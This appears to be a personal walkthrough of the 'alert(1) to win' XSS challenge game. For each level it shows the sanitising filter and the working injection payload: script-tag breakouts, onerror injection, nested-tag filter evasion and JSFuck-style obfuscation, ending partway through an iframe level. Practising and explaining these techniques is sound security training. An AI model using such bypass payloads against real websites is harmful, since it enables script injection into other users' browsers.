This documents a bit of a journey on [alert(1) to win](https://alf.nu/alert1).
Sometimes it seemed like it was broken. Other times it was pretty fun and worked.

__NOTE:__ If, like me, you're a bit of a FireFox fanboy: It doesn't always work on FF for some reason. Atleast the `Markdown` challenge definitely does not function properly (doesn't register a win), so after much hair pulling I moved onto Chrome for these.

__Done__
- [x] Warmup
- [x] Adobe
- [x] JSON
- [x] Javascript
- [x] Markdown
- [x] DOM
- [x] Callback
- [x] Skandia
- [ ] ~~Template~~ `Broken`
- [x] JSON ][
- [x] Callback ][
- [x] Skandia ][
- [ ] iframe
- [ ] TI(S)M
- [ ] JSON Ⅲ
- [ ] Skandia Ⅲ
- [ ] RFC4627
- [ ] Brunn
- [ ] No
- [ ] K'Z'K
- [ ] K'Z'K
---

## Warmup
### filter:
```javascript
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

### Win with:
```
",alert(1),"
```
12 characters


## Adobe
### filter:
```javascript
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

### Win with:
```
\");alert(1)//
```
14 characters

## JSON
### filter:
```javascript
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

### Win with:
```
</script><script>alert(1)//
```
27 characters

## Javascript
### filter
```javascript
function escape(s) {
  var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
  console.log(url);

  var a = document.createElement('a');
  a.href = url;
  document.body.appendChild(a);
  a.click();
}
```
### comments
This was very hard to figure out, mainly because the script didn't give me feedback and I had to manually crawl the iframe in developer tools after each attempt to see what the output code was.
__Note__: Switching to chrome and the iframe/console output stuff worked.

So anyways, let's note that it's a url, so let's URI encode a `"`->`%22`


### Win with:
```
%22);alert(1)//
```
15 characters


## Markdown
### filter
```javascript
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```


### comments
Took me a while to realise that the key to this is hitting _both_ filters with one string, which would allow you to escape one html element into the next.

I also resorted to copy-pasting the results of my lines into atom so I could get some syntax highlighting to make it easier to understand what was going on an what was being escaped where.

some WIP stuff:
`http://[[x|onerror=]]alert(1)` gives:
```html
<a href="http://<img alt="onerror=" src="x.gif">alert(1)">http://<img alt="onerror=" src="x.gif">alert(1)</a>
```
which looks fairly promising. We've got an `onerror` handler, though it's on a `anchor` and the contents is junk at the moment.

`[[x|http://onerror=alert(1)+]]alert(1)` gives:
```html
<img alt="<a href="http://onerror=alert(1)+" src="x.gif">alert(1)">http://onerror=alert(1)+]]alert(1)</a>
```
I worried that I needed to break apart the `http://` and `onerror`, but I tried `<a http://href="bob.com" http://style="color:red;"> test</a>` in a plain window and it styled itself fine, so apparently the `//` can be a delimiter.
This still didn't work though, and I assume it's because onerror doesn't have quotes after it.

`[[x|http://onerror=alert(1);//]]alert(1)` results in:
```html
<img alt="<a href="http://onerror=alert(1);//" src="x.gif">alert(1)">http://onerror=alert(1);//]]alert(1)</a>
```
While this didn't work on the [alert(1) to win](https://alf.nu/alert1) page, it did when I pasted it into a html file and opened that in a browser, so maybe the website is wrong?
_Turns out its something special about FF and (I'm assuming) it's iframes, because it works in chrome._

So I shortened it down and shifted to Chrome.

### Win with:
```
[[x|http://onerror=alert(1)//]]
```
31 characters

## DOM
### filter
```javascript
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```

### comments
Noticing that it's calling _any_ `document` method, your first port of call is looking at [MDN- document docs](https://developer.mozilla.org/en-US/docs/Web/API/Document) to figure out _which_ method we'd like to exploit.
```
createAttribute()
createCDATASection()
createComment()
createDocumentFragment()
createElement()
createElementNS()
createEntityReference()
createEvent()
createExpression()
createNodeIterator()
createNSResolver()
createProcessingInstruction()
createRange()
createTextNode()
createTouch()
createTouchList()
createTreeWalker()
```

My first thought was "look for functions that take 2 arguments", because the use of additional `#`'s in the input + the use of `.apply()` means we can use additional args, which may be the trick.

But then I thought "which of these might not escape properly"
and it turns out `.createComment()` doesn't escape `-->` :upside_down_face:

### Win with:
```
Comment#--><script>alert(1)</script>
```
36 characters

## Callback
### filter
```javascript
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/);

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```
### comments
So the first thought is to call `alert`, but then it'll be called with the object. Then I thought we need something that will call the `values` within a JSON object. We could use `Object.values(<object>)` to get an array of the values in the array, but then we can't do any calls or anything.

__Alright, I'll admit I had to look this up after ~2 hours pondering what functions to call__
[This blog](http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/) notes that single quotes don't get escaped. And we can have one before the `#`, so we can turn the first bits of the script into just a string and ignore it.
I feel bad for not figuring this out myself...


### win with:
```
'#';alert(1)//
```
14 characters


## Skandia
### filter
```javascript
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```

### comments
A _lazy_ way to win this is to use a quirk of Javascript shown off in [jsFuck](http://www.jsfuck.com/)
```
");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//
```
But that's 1232 characters long and really jsfuck is just meant to show off you can do _everything_ in javascript with only 6 characters: `[]()+!`

If we relax that a bit, but follow similar ideas, we can get a shorter one:
in fact, lets build it from the ground up to explain it:
we need the characters `a`, `l`, `e`, `r` and `t`. You may notice that the word `true` and `false` contain all those characters:
`![] === false`: get a `false` value
`![]+[] === "false"`: `+[]` forces it to a string (could use `+''` as well, but lets stick to 'near jsfuck' syntax)
`(![])+[]+(!![])+[] === "falsetrue"` we have a string with everything we need, now to pull it out.
`((![])+[]+(!![])+[])[1]+((![])+[]+(!![])+[])[2]+((![])+[]+(!![])+[])[4]+((![])+[]+(!![])+[])[6]+((![])+[]+(!![])+[])[5] === "alert"`
`((![])+[]+(!![])+[])[1]+((![])+[]+(!![])+[])[2]+((![])+[]+(!![])+[])[4]+((![])+[]+(!![])+[])[6]+((![])+[]+(!![])+[])[5] + '(1)' === "alert(1)"` we have the string, now we need to wrap it in in the `Function()` constructor and call it!
But remember, you can do multiple statements inline, so we can shorten that by declaring a variable:
`_=((![])+[]+(!![])+[]);_[1]+_[2]+_[4]+_[6]+_[5]+'(1)' === "alert(1)"`
To call this, we need the `Fuction()` constructor. We can get reference from most inbuilt methods:
`[].sort.constructor === Function`
Lets build those strings from our string:
`_=(![]+[]+!![]+{}+[][![]]);_[3]+_[10]+_[6]+_[5] === "sort"`
`_=(![]+[]+!![]+{}+[][![]]);_[14]+_[10]+_[25]+_[3]+_[5]+_[6]+_[7]+_[14]+_[5]+_[10]+_[6] === "constructor"`

So
`(Function('alert(1)'))()`
becomes
`([].sort.constructor('alert(1)'))()`
and with string subs:
```javascript
_=(![]+[]+!![]+{}+[][![]]); ([][_[3]+_[10]+_[6]+_[5]][_[14]+_[10]+_[25]+_[3]+_[5]+_[6]+_[7]+_[14]+_[5]+_[10]+_[6]](_[1]+_[2]+_[4]+_[6]+_[5]+'(1)'))()
```
(good thing I put in syntax highlighting there to help you!)

so the string for this challenge would be:
```
");_=(![]+[]+!![]+{}+{}._);([][_[3]+_[10]+_[6]+_[5]][_[14]+_[10]+_[25]+_[3]+_[5]+_[6]+_[7]+_[14]+_[5]+_[10]+_[6]](_[1]+_[2]+_[4]+_[6]+_[5]+'(1)'))()//
```
which is 150 characters, so still a bit long. (But obscure to anyone trying to figure out what the hell we're doing)

_tactic switch_

the whole thing doesn't have to be a string:
`_=((![])+[]+(!![])+{});window[_[1]+_[2]+_[4]+_[6]+_[5]](1)`
now we just need a reference to `window` or `this`.

I've seen please say `with(0) x=[].sort,x()` get's you a reference to the window object, but no such luck for me.

In the end I didn't find a good way to get to `window`. If you know something, let me know.

_Note_: if you want to see the full solution for this, checkout the later [Skandia II writeup](#Skandia%20%5D%5B)

__another way__
well, you could just use the fact that domains aren't case sensitive and neither is html, so you can src your script from somewhere: (I spun up something that responded with 'alert(1)' to any GET on port 80)
`")</script><script src="http:127.0.0.1">`
`")</script><script src="http:localhost">`
note: you could shorten this further by messing with your local DNS resolution to get shorter urls. Also, remove those quotes.

### win with:
```
</script><script src=http:localhost>
```
36 characters

(28 characters is acheived if you modify your machine to route a 1 character domain to your script file.)


## Template
### filter
```javascript
function escape(s) {
  function htmlEscape(s) {
    return s.replace(/./g, function(x) {
       return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[x] || x;       
     });
  }

  function expandTemplate(template, args) {
    return template.replace(
        /{(\w+)}/g,
        function(_, n) {
           return htmlEscape(args[n]);
         });
  }

  return expandTemplate(
    "                                                \n\
      <h2>Hello, <span id=name></span>!</h2>         \n\
      <script>                                       \n\
         var v = document.getElementById('name');    \n\
         v.innerHTML = '<a href=#>{name}</a>';       \n\
      <\/script>                                     \n\
    ",
    { name : s }
  );
}
```

### comments:
So I noticed I could unicode, so I tried:
`\u003cscript\u003ealert(1);\u003c/script\u003e`
which, when I inspected the iframe, had created this:
```html
<html><head></head><body>                                                
      <h2>Hello, <span id="name"><a href="#"><script>alert(1);</script></a></span>!</h2>         
      <script>                                       
         var v = document.getElementById('name');    
         v.innerHTML = '<a href=#>\u003cscript\u003ealert(1);\u003c/script\u003e</a>';       
      </script>                                     
    </body></html>
```
but no win for me :(
Again, pasting this into a html file and opening it with a browser worked, so maybe this was bugged. But I'd switched to chrome, which was what had fixed it last time!

I tried it in FF as well and no luck.

### Win with:
I going to assume `\u003cscript\u003ealert(1);\u003c/script\u003e` is meant to work, but the site won't believe me.
I checked that [writeup I found earlier](http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/) and neither of his worked either, so I'll assume this is broken?


## JSON ][
### filter
```javascript
function escape(s) {
  s = JSON.stringify(s).replace(/<\/script/gi, '');

  return '<script>console.log(' + s + ');</script>';
}
```

### comment
it's escaping the end of scripts by replacing it with blank, but it's not double passing the string, so we'll put in a script end inside a script end!

### Win with:
```
</scrip</scriptt><script>alert(1)//
```
35 characters


## Callback ][
### filter
```javascript
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/);

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/\//g, '\\/');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```

### comments
seems fairly similar to the previous callback, but we can't end the JS with `//` comments, because they get escaped.
So how do we make valid syntax?
Well, lets use html comments!

### Win with:
```
'#';alert(1)<!--
```
16 characters


## Skandia ][
### filter
```javascript
function escape(s) {
  if (/[<>]/.test(s)) return '-';

  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```
### comments
Looks like they stopped our ultra short method by blocking `<>`, but not the more obfuscated one.
__note:__ At this time I realised a few optimisations I could put in to trim a few characters.

After I'd _"won"_ I could see that some people had managed it in considerably less.
`<100` seemed like a good optimisation target, but I'm lazy. Maybe I'll get back to this and improve it later :upside_down_face:

### win with:
```
");_=![]+[]+!![]+{}+{}._;[][_[3]+_[10]+_[6]+_[5]][_[14]+_[10]+_[25]+_[3]+_[5]+_[6]+_[7]+_[14]+_[5]+_[10]+_[6]](_[1]+_[2]+_[4]+_[6]+_[5]+'(1)')()//
```
146 characters


## iframe
### filter
```javascript
function escape(s) {
  var tag = document.createElement('iframe');

  // For this one, you get to run any code you want, but in a "sandboxed" iframe.
  //
  // https://4i.am/?...raw=... just outputs whatever you pass in.
  //
  // Alerting from 4i.am won't count.

  s = '<script>' + s + '<\/script>';
  tag.src = 'https://4i.am/?:XSS=0&CT=text/html&raw=' + encodeURIComponent(s);

  window.WINNING = function() { youWon = true; };

  tag.setAttribute('onload', 'youWon && alert(1)');
  return tag.outerHTML;
}
```

### comments
Well first thing I want is to actually know what i'm working in, so I try this JS:
```javascript
let x = Object.keys(window);
const div = document.createElement('div');
div.innerText = x.toString();
document.body.appendChild(div);
```
Which should print all the methods and properties of `window` in the frame.
...
Except it doesn't
...

_Please god don't let this be someone trying to be too clever and fucking up iframes in a way that the challenge is impossible._

navigating to the url for that:
```
https://4i.am/?:XSS=0&CT=text/html&raw=%3Cscript%3Elet%20x%20%3D%20Object.keys(window)%3B%0Aconst%20div%20%3D%20document.createElement(%27div%27)%3B%0Adiv.innerText%20%3D%20x.toString()%3B%0Adocument.body.appendChild(div)%3B%3C%2Fscript%3E
```
And popping up dev console, we see that all the code runs in `head` tags...
... so `document.body` doesn't exist when the script runs...

so I use `setTimeout` to wait and then append, And I can see this on window:
```
alert, applicationCache, atob, blur, btoa, caches, cancelAnimationFrame, cancelIdleCallback, captureEvents, chrome, clearInterval, clearTimeout, clientInformation, close, closed, confirm, createImageBitmap, crypto, customElements, defaultStatus, defaultstatus, devicePixelRatio, document, external, fetch, find, focus, frameElement, frames, getComputedStyle, getSelection, history, indexedDB, innerHeight, innerWidth, isSecureContext, length, localStorage, location, locationbar, matchMedia, menubar, moveBy, moveTo, name, navigator, onabort, onafterprint, onanimationend, onanimationiteration, onanimationstart, onappinstalled, onauxclick, onbeforeinstallprompt, onbeforeprint, onbeforeunload, onblur, oncancel, oncanplay, oncanplaythrough, onchange, onclick, onclose, oncontextmenu, oncuechange, ondblclick, ondevicemotion, ondeviceorientation, ondeviceorientationabsolute, ondrag, ondragend, ondragenter, ondragleave, ondragover, ondragstart, ondrop, ondurationchange, onemptied, onended, onerror, onfocus, ongotpointercapture, onhashchange, oninput, oninvalid, onkeydown, onkeypress, onkeyup, onlanguagechange, onload, onloadeddata, onloadedmetadata, onloadstart, onlostpointercapture, onmessage, onmessageerror, onmousedown, onmouseenter, onmouseleave, onmousemove, onmouseout, onmouseover, onmouseup, onmousewheel, onoffline, ononline, onpagehide, onpageshow, onpause, onplay, onplaying, onpointercancel, onpointerdown, onpointerenter, onpointerleave, onpointermove, onpointerout, onpointerover, onpointerup, sonpopstate, onprogress, onratechange, onrejectionhandled, onreset, onresize, onscroll, onsearch, onseeked, onseeking, onselect, onstalled, onstorage, onsubmit, onsuspend, ontimeupdate, ontoggle, ontransitionend, onunhandledrejection, onunload, onvolumechange, onwaiting, onwebkitanimationend, onwebkitanimationiteration, onwebkitanimationstart, onwebkittransitionend, onwheel, open, openDatabase, opener, origin, outerHeight, outerWidth, pageXOffset, pageYOffset, parent, performance, personalbar, postMessage, print, prompt, releaseEvents, requestAnimationFrame, requestIdleCallback, resizeBy, resizeTo, screen, screenLeft, screenTop, screenX, screenY, scroll, scrollBy, scrollTo, scrollX, scrollY, scrollbars, self, sessionStorage, setInterval, setTimeout, speechSynthesis, status, statusbar, stop, styleMedia, toolbar, top, visualViewport, webkitCancelAnimationFrame, webkitRequestAnimationFrame, webkitRequestFileSystem, webkitResolveLocalFileSystemURL, webkitStorageInfo, window
```
> wallOfText.jpg

_whelp, that might not be useful_

Let's take a step back and think about what we actually _need to do_ to win this:
- `alert(1)` gets called for us if `youWon == true` in the main context
  - but this must be true _onload_ of iframe.
- calling `window.WINNING()` in the main context will cause it to be `true`
 - but once we've called it, we'll have to force another `onload` event (I think)
